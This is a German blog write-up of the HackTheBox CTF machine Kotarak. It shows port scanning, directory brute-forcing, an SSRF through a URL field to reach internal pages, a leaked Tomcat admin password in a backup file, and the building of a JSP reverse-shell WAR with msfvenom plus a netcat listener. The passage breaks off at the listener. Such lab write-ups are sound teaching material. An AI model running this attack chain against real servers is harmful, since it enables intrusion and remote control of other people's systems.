<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="m10x ">
<meta name="description" content="Kotarak ist eine der sehr schwierigen CTF Challenges von HackTheBox.
Tipps Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von außen haben, allerdings von einer anderen Webseite aus!
Ein Teil von Kotarak wird auch in der HackTheBox Maschine Jerry behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort
Alle wichtigen Informationen zur Privilege Escalation befinden sich im /root Verzeichnis
Video Anleitung Als erstes machen wir natürlich einen Nmap-Scan." />
<meta name="keywords" content="m10x, ctf, penetration test, hackthebox, ctf, german" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://www.m10x.de/posts/2018/12/hackthebox-kotarak-writeup-tipps--anleitung/" />


    <title>
        
            HackTheBox - Kotarak WriteUp | Tipps &#43; Anleitung :: Maximilian Hildebrand  — German Penetration Testing Blog
        
    </title>





<link rel="stylesheet" href="https://www.m10x.de/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">



    <link rel="apple-touch-icon" sizes="180x180" href="https://www.m10x.de/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://www.m10x.de/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://www.m10x.de/favicon-16x16.png">
    <link rel="manifest" href="https://www.m10x.de/site.webmanifest">
    <link rel="mask-icon" href="https://www.m10x.de/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://www.m10x.de/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="HackTheBox - Kotarak WriteUp | Tipps &#43; Anleitung">
<meta itemprop="description" content="Kotarak ist eine der sehr schwierigen CTF Challenges von HackTheBox.
Tipps Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von außen haben, allerdings von einer anderen Webseite aus!
Ein Teil von Kotarak wird auch in der HackTheBox Maschine Jerry behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort
Alle wichtigen Informationen zur Privilege Escalation befinden sich im /root Verzeichnis
Video Anleitung Als erstes machen wir natürlich einen Nmap-Scan."><meta itemprop="datePublished" content="2018-12-05T16:00:56+01:00" />
<meta itemprop="dateModified" content="2018-12-05T16:00:56+01:00" />
<meta itemprop="wordCount" content="2634"><meta itemprop="image" content="https://www.m10x.de"/>
<meta itemprop="keywords" content="hackthebox,ctf,german," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://www.m10x.de"/>

<meta name="twitter:title" content="HackTheBox - Kotarak WriteUp | Tipps &#43; Anleitung"/>
<meta name="twitter:description" content="Kotarak ist eine der sehr schwierigen CTF Challenges von HackTheBox.
Tipps Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von außen haben, allerdings von einer anderen Webseite aus!
Ein Teil von Kotarak wird auch in der HackTheBox Maschine Jerry behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort
Alle wichtigen Informationen zur Privilege Escalation befinden sich im /root Verzeichnis
Video Anleitung Als erstes machen wir natürlich einen Nmap-Scan."/>



    <meta property="og:title" content="HackTheBox - Kotarak WriteUp | Tipps &#43; Anleitung" />
<meta property="og:description" content="Kotarak ist eine der sehr schwierigen CTF Challenges von HackTheBox.
Tipps Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von außen haben, allerdings von einer anderen Webseite aus!
Ein Teil von Kotarak wird auch in der HackTheBox Maschine Jerry behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort
Alle wichtigen Informationen zur Privilege Escalation befinden sich im /root Verzeichnis
Video Anleitung Als erstes machen wir natürlich einen Nmap-Scan." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.m10x.de/posts/2018/12/hackthebox-kotarak-writeup-tipps--anleitung/" /><meta property="og:image" content="https://www.m10x.de"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2018-12-05T16:00:56+01:00" />
<meta property="article:modified_time" content="2018-12-05T16:00:56+01:00" />






    <meta property="article:published_time" content="2018-12-05 16:00:56 &#43;0100 &#43;0100" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://www.m10x.de/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                $ cd /home/m10x/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://www.m10x.de/about/">About</a></li><li><a href="https://www.m10x.de/summary/">Summary</a></li><li><a href="https://www.m10x.de/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        13 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://www.m10x.de/posts/2018/12/hackthebox-kotarak-writeup-tipps--anleitung/">HackTheBox - Kotarak WriteUp | Tipps + Anleitung</a>
      </h1>

      

      

      

      <div class="post-content">
        <p><a href="https://www.hackthebox.eu/home/machines/profile/101">Kotarak</a> ist eine der sehr schwierigen CTF Challenges von <a href="https://hackthebox.eu/">HackTheBox</a>.</p>
<p><img src="https://imgur.com/yHS2bzB.jpg" alt="schwierigkeit"></p>
<h2 id="tipps"><strong>Tipps</strong></h2>
<p>Wir müssen auf eine Webseite zugreifen, auf welche wir keinen Zugriff von außen haben, allerdings von einer anderen Webseite aus!</p>
<p>Ein Teil von Kotarak wird auch in der HackTheBox Maschine <a href="https://www.m10x.de/ctf-wargame/hackthebox-jerry/">Jerry</a> behandelt, allerdings brauchen wir erstmal das Tomcat Admin Passwort</p>
<p>Alle wichtigen Informationen zur Privilege Escalation befinden sich im <strong>/root</strong> Verzeichnis</p>
<h2 id="video"><strong>Video</strong></h2>
<p><a href="http://www.youtube.com/watch?v=yYhYnWo7AUU"><img src="http://img.youtube.com/vi/yYhYnWo7AUU/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
<h2 id="anleitung"><strong>Anleitung</strong></h2>
<p>Als erstes machen wir natürlich einen Nmap-Scan.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# nmap -A 10.10.10.55
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">2048</span> e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">256</span> e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">256</span> 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 <span style="color:#f92672">(</span>EdDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8009/tcp open ajp13 Apache Jserv <span style="color:#f92672">(</span>Protocol v1.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ajp-methods:
</span></span><span style="display:flex;"><span>| Supported methods: GET HEAD POST PUT DELETE OPTIONS
</span></span><span style="display:flex;"><span>| Potentially risky methods: PUT DELETE
</span></span><span style="display:flex;"><span>|_ See https://nmap.org/nsedoc/scripts/ajp-methods.html
</span></span><span style="display:flex;"><span>8080/tcp open http Apache Tomcat 8.5.5
</span></span><span style="display:flex;"><span>|_http-favicon: Apache Tomcat
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_ Potentially risky methods: PUT DELETE
</span></span><span style="display:flex;"><span>|_http-title: Apache Tomcat/8.5.5 - Error report
</span></span><span style="display:flex;"><span>60000/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title:         Kotarak Web Hosting        
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>2 offene Webserver Ports wurden gefunden.</p>
<p>Wenn wir versuchen <strong>10.10.10.55:8080</strong> aufzurufen, bekommen wir als Rückmeldung nur <strong>404 - not found</strong>.<br>
Bruteforcen wir als nächstes Verzeichnisse auf Port 8080.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# gobuster -u http://10.10.10.55:8080 -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">250</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Mode : dir
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url/Domain : http://10.10.10.55:8080/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads : <span style="color:#ae81ff">250</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist : /usr/share/wordlists/dirb/common.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes : 200,204,301,302,307
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================</span>
</span></span><span style="display:flex;"><span>/df <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/docs <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/favicon.ico <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/examples <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/host-manager <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/manager <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================</span>
</span></span></code></pre></div><p><strong>/manager</strong> klingt interessant.</p>
<p>Sehen wir uns <strong>/manager</strong> mal an.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">404</span> Not found
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The page you tried to access <span style="color:#f92672">(</span>/manager/<span style="color:#f92672">)</span> does not exist.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The Manager application has been re-structured <span style="color:#66d9ef">for</span> Tomcat <span style="color:#ae81ff">7</span> onwards and some of URLs have changed. All URLs used to access the Manager application should now start with one of the following options:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/manager/html <span style="color:#66d9ef">for</span> the HTML GUI
</span></span><span style="display:flex;"><span>/manager/text <span style="color:#66d9ef">for</span> the text interface
</span></span><span style="display:flex;"><span>/manager/jmxproxy <span style="color:#66d9ef">for</span> the JMX proxy
</span></span><span style="display:flex;"><span>/manager/status <span style="color:#66d9ef">for</span> the status pages
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Note that the URL <span style="color:#66d9ef">for</span> the text interface has changed from <span style="color:#e6db74">&#34;/manager&#34;</span> to <span style="color:#e6db74">&#34;/manager/text&#34;</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Ok, befolgen wir den Hinweis und versuchen <strong>/manager/html</strong>.</p>
<p><img src="https://imgur.com/kfAYdHl.jpg" alt="bild2"></p>
<p>Wir benötigen leider einen Nutzernamen und ein Passwort um an dieser Stelle weiter zu kommen&hellip;</p>
<p>Die Webseite auf <strong>Port 8080</strong> bringt uns aktuell nicht weiter, sehen wir uns die Webseite auf <strong>Port 60000</strong> mal an!</p>
<p><img src="https://imgur.com/U9PUOrk.jpg" alt="bild3"></p>
<p>Auf der Webseite ist nicht viel zu sehen, allerdings haben wir ein Textfeld, in dem wir z.B. eine Url eingeben können, zu dieser wir dann weitergeleitet werden!<br>
Bruteforcen wir auch hier nach Verzeichnissen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# gobuster -u http://10.10.10.55:60000 -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">250</span> -s 200,204,301,302,307,403
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Gobuster v1.2 OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Mode : dir
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url/Domain : http://10.10.10.55:60000/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads : <span style="color:#ae81ff">250</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist : /usr/share/wordlists/dirb/common.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes : 302,307,403,200,204,301
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================</span>
</span></span><span style="display:flex;"><span>/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/info.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================</span>
</span></span></code></pre></div><p><strong>server-status</strong> klingt nach etwas, was hilfreich sein könnte! Wenn wir allerdings <strong>http://10.10.10.55:60000/server-status</strong> besuchen, bekommen wir leider nur <strong>403 - forbidden</strong> zurück.<br>
Aber was wenn wir <strong>http://10.10.10.55:60000/server-status</strong> bzw. <strong>http://localhost:60000/server-status</strong> in das Textfeld eingeben und das Verzeichnis auf diese Art und Weise besuchen?</p>
<p><img src="https://imgur.com/Nlyy2QX.jpg" alt="bild"></p>
<p>Es hat funktioniert! Wahrscheinlich kann man <strong>server-status</strong> nicht von außerhalb des Servers aufrufen.</p>
<p>Hier ist es auffällig, dass bei vielen Einträgen <strong>127.0.0.1:888</strong> vom localhost aus aufgerufen wurden.</p>
<p>Rufen wir <strong>http://localhost:888/</strong> wieder durch <strong>10.10.10.55:60000</strong> auf:</p>
<p><img src="https://imgur.com/pCLVglr.jpg" alt="bild5"></p>
<p>Wir können dort mehrere Dateien sehen. Wir können allerdings nicht einfach auf einen Dateinamen klicken, um diese aufzurufen. Sehen wir mal in den Seitenquelltext.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>&lt;tr &gt;
</span></span><span style="display:flex;"><span>&lt;td width<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;27&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?doc=backup&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElement&#34;</span>&gt;&lt;img src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inc/images/generic.png&#34;</span> alt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dir&#34;</span> width<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;22&#34;</span> height<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;22&#34;</span> border<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;&lt;/a&gt;&lt;/td&gt;
</span></span><span style="display:flex;"><span>&lt;td class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElement&#34;</span>&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?doc=backup&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElement&#34;</span>&gt;backup&lt;/a&gt;&lt;/td&gt;
</span></span><span style="display:flex;"><span>&lt;td class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElementInfo&#34;</span>&gt;&amp;nbsp;2.22 kB&lt;/td&gt;
</span></span><span style="display:flex;"><span>&lt;td class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tableElementInfo&#34;</span>&gt;&amp;nbsp;<span style="color:#ae81ff">18</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">2017</span> 21:42:11&lt;/td&gt;
</span></span><span style="display:flex;"><span>&lt;/tr&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#f92672">]</span>
</span></span></code></pre></div><p><strong>?doc=backup</strong> verweist also auf die Datei <strong>backup</strong>.</p>
<p>Rufen wir also <strong>http://localhost:888/?doc=backup</strong> auf.</p>
<p>Wir sehen eine leere Seite&hellip; Schauen wir wieder mal auf den Seitenquelltext.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Licensed to the Apache Software Foundation (ASF) under one or more
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">contributor license agreements. See the NOTICE file distributed with
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">this work for additional information regarding copyright ownership.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">The ASF licenses this file to You under the Apache License, Version 2.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">(the &#34;License&#34;); you may not use this file except in compliance with
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">the License. You may obtain a copy of the License at
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">http://www.apache.org/licenses/LICENSE-2.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Unless required by applicable law or agreed to in writing, software
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">See the License for the specific language governing permissions and
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">limitations under the License.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;tomcat-users</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://tomcat.apache.org/xml&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">NOTE: By default, no user is included in the &#34;manager-gui&#34; role required
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">to operate the &#34;/manager/html&#34; web application. If you wish to use this app,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">you must define such a user - the username and password are arbitrary. It is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">strongly recommended that you do NOT use one of the users in the commented out
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">section below since they are intended for use with the examples web
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">application.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">NOTE: The sample user and role entries below are intended for use with the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">examples web application. They are wrapped in a comment and thus are ignored
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">when reading this file. If you wish to configure these users for use with the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">them. You will also need to set the passwords to something appropriate.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;role rolename=&#34;tomcat&#34;/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;role rolename=&#34;role1&#34;/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;user username=&#34;tomcat&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat&#34;/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;user username=&#34;both&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat,role1&#34;/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;user username=&#34;role1&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;role1&#34;/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;3@g01PdhB!&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;manager,manager-gui,admin-gui,manager-script&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/tomcat-users&gt;</span>
</span></span></code></pre></div><p>Ein Eintrag mit dem Nutzernamen <strong>admin</strong> und dem dazugehörigen Passwort <strong>3@g01PdhB!</strong>.</p>
<p>Probieren wir die Anmeldedaten doch bei <strong>10.10.10.55:8080/manager/html</strong> aus!</p>
<p><img src="https://imgur.com/KrRzVJO.jpg" alt="bild6"></p>
<p>Es hat funktioniert. Wir sind nun als Admin im Tomcat Manager angemeldet und können nun, wie man ganz unten auf dem Screenshot sieht, eine <a href="https://de.wikipedia.org/wiki/Web_Application_Archive">WAR</a>-Datei hochladen und diese sogar auch ausführen lassen.</p>
<p>Mit Hilfe von <strong>msfvenom</strong> können wir eine <strong>Java JSP Reverse Shell</strong> erstellen und diese als <strong>WAR</strong>-Datei verpacken.<br>
Sehen wir dafür zuerst unsere IP-Adresse nach.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ifconfig tun0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>inet 10.10.15.158 netmask 255.255.254.0 destination 10.10.15.158
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Suchen wir nun nach Java-Payloads.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# msfvenom -l payloads | grep java
</span></span><span style="display:flex;"><span>java/jsp_shell_bind_tcp Listen <span style="color:#66d9ef">for</span> a connection and spawn a command shell
</span></span><span style="display:flex;"><span>java/jsp_shell_reverse_tcp Connect back to attacker and spawn a command shell
</span></span><span style="display:flex;"><span>java/meterpreter/bind_tcp Run a meterpreter server in Java. Listen <span style="color:#66d9ef">for</span> a connection
</span></span><span style="display:flex;"><span>java/meterpreter/reverse_http Run a meterpreter server in Java. Tunnel communication over HTTP
</span></span><span style="display:flex;"><span>java/meterpreter/reverse_https Run a meterpreter server in Java. Tunnel communication over HTTPS
</span></span><span style="display:flex;"><span>java/meterpreter/reverse_tcp Run a meterpreter server in Java. Connect back stager
</span></span><span style="display:flex;"><span>java/shell/bind_tcp Spawn a piped command shell <span style="color:#f92672">(</span>cmd.exe on Windows, /bin/sh everywhere <span style="color:#66d9ef">else</span><span style="color:#f92672">)</span>. Listen <span style="color:#66d9ef">for</span> a connection
</span></span><span style="display:flex;"><span>java/shell/reverse_tcp Spawn a piped command shell <span style="color:#f92672">(</span>cmd.exe on Windows, /bin/sh everywhere <span style="color:#66d9ef">else</span><span style="color:#f92672">)</span>. Connect back stager
</span></span><span style="display:flex;"><span>jaa/shell_reverse_tcp Connect back to attacker and spawn a command shell
</span></span></code></pre></div><p>Erstellen wir nun den <strong>Java-Payload</strong>, geben unsere IP-Adresse als <strong>LHOST</strong> an, den Port an dem wir die Verbindung empfangen wollen als <strong>LPORT</strong> und geben mit <strong>-f</strong> war an, dass wir dies als <strong>WAR</strong>-Datei haben wollen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.15.158 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f war &gt; m10x.war
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">1090</span> bytes
</span></span><span style="display:flex;"><span>Fial size of war file: <span style="color:#ae81ff">1090</span> bytes
</span></span></code></pre></div><p>Jetzt können wir mit <strong>Netcat</strong> auf dem Port, den wir angegeben haben, auf eine Verbindung warten lassen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>litening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
